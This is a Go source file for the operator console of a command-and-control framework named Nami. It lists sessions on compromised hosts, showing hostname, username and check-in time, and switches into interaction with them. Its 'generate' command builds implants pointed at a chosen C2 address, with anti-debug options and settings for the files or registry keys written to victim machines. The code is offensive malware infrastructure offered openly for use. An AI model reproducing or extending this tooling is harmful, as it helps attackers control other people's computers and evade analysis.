package NamiPrompt

import (
	"NamiCommands"
	"NamiDatabase"
	"NamiUtilities"
	"database/sql"
	"fmt"
	"os"

	"github.com/desertbit/grumble"
	"github.com/fatih/color"
	"github.com/rodaine/table"
)

type NamiClient struct {
	App *grumble.App
}

func CreatePrompt(finished chan bool, listenerIp string, listenerPort int) {
	con := NamiClient{
		App: grumble.New(&grumble.Config{
			Name:            "Nami",
			Description:     fmt.Sprintf("Nami C2 Framework\n\tListener IP: %s\n\tListener Port: %d", listenerIp, listenerPort),
			HelpSubCommands: true,
		}),
	}
	con.App.AddCommand(&grumble.Command{
		Name: "sessions",
		Help: "view and interact with sessions",

		Flags: func(f *grumble.Flags) {
			f.Int("i", "interact", 0, "session to interact with")
		},

		Run: func(c *grumble.Context) error {
			if c.Flags.Int("interact") == 0 {
				rows := NamiDatabase.QuerySessions()
				var sessionId int
				var uuid string
				var hostname string
				var username string
				var checkin_time string
				var implant_name string
				tableFormat := table.New("ID", "Session ID", "Hostname", "Username", "Implant Name", "Check-In Time")
				tableFormat.WithHeaderFormatter(color.New(color.FgGreen, color.Underline).SprintfFunc()).WithFirstColumnFormatter(color.New(color.FgYellow).SprintfFunc())
				if rows.Next() {
					rows.Scan(&sessionId, &uuid, &hostname, &username, &implant_name, &checkin_time)
					tableFormat.AddRow(sessionId, uuid, hostname, username, implant_name, checkin_time)
					for rows.Next() {
						rows.Scan(&sessionId, &uuid, &hostname, &username, &implant_name, &checkin_time)
						tableFormat.AddRow(sessionId, uuid, hostname, username, implant_name, checkin_time)
					}
					tableFormat.Print()
				} else {
					c.App.Println("No Active Sessions!")
				}
				return nil
			} else {
				db_results := NamiDatabase.QuerySessionById(c.Flags.Int("interact"))
				var uuid string
				err := db_results.Scan(&uuid)
				if err == sql.ErrNoRows {
					c.App.Println(fmt.Sprintf("No Session With ID %d", c.Flags.Int("interact")))
				} else {
					c.App.SetPrompt(fmt.Sprintf("Nami [%d] » ", c.Flags.Int("interact")))
					SessionsSubCommands(con, uuid)
				}
			}
			return nil
		},
	})

	con.App.AddCommand(&grumble.Command{
		Name: "generate",
		Help: "Generate a Nami implant",

		Flags: func(f *grumble.Flags) {
			f.String("i", "ip", "", "IP address for C2")
			f.Int("p", "port", 0, "Port for C2")
			f.Int("a", "arch", 32, "Architecture of implant (32 or 64)")
			f.Bool("d", "debug", false, "Implement anti-debug measures")
			f.String("n", "name", "Nami", "Name of files or Registry keys written to system.")
		},

		Run: func(c *grumble.Context) error {
			if c.Flags.String("ip") != "" && c.Flags.Int("port") != 0 {
				implantName := NamiUtilities.GenerateRandomImplantName()
				NamiUtilities.OverwriteImplantConfig(c.Flags.String("ip"), c.Flags.Int("port"), c.Flags.Int("arch"), c.Flags.Bool("debug"), c.Flags.String("name"), implantName)
				generateReturn := NamiCommands.GenerateImplant(c.Flags.Int("arch"), implantName)
				fmt.Println(generateReturn)
				return nil
			} else if c.Flags.String("ip") == "" {
				fmt.Println("No IP specified!")
			} else if c.Flags.Int("port") != 0 {
				fmt.Println("No Port specified!")
			}
			return nil
		},
	})

	con.App.SetPrintASCIILogo(func(a *grumble.App) {
		header_bytes, err := os.ReadFile("resources/NAMI_header.txt")
		if err != nil {
			a.Println("\n")
		} else {
			a.Println(string(header_bytes))
		}
	})
	err := con.App.Run()
	if err != nil {
		fmt.Println(err)
	}
	finished <- true
}
